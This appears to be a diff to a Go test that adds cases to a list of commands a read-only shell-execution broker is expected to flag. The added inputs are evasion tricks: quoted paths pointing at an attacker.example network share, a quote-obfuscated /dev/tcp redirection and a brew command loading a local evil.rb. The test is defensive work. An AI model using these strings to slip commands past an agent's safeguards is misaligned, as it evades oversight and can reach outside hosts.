@@ -49,6 +49,12 @@ func TestReadOnlyExec_BrokerAsks(t *testing.T) {
 			"HEAD -m POST http://127.0.0.1:9/x",
 			"sort -T . -S 1k big",
 			"file -p victim.txt",
+			"cat 'x'//attacker.example/share/y",
+			`head -n 1 '/"/attacker.example/share/y'`,
+			"cat < /dev/t'c'p/127.0.0.1/9",
+			"git branch --sort=signature",
+			"Get-Date -p v",
+			"brew info ./evil.rb",
 		} {
 			before := asked
 			if b.Confirm(ctx, "os_exec", cmd) {
